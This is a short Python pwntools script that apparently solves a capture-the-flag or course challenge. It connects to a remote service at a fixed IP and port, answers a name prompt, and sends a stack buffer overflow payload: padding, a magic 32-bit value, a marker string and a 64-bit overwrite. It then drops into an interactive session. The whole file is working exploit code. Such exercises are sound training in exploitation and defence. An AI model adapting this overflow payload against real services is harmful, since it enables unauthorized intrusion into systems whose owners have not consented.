from pwn import *

r = remote("141.85.224.104", 6660)

p = process(context.binary.path)
r.recvuntil(b"first name? ")
r.sendline(b"BBBBBB")
r.recvuntil(b"last name? ")

payload = b"A" * 128
payload += p32(0x97979797)
payload += b"prince of darkness"
payload += b"B" * 18
payload += p64(0x1112131415161718)

r.sendline(payload)
r.interactive()
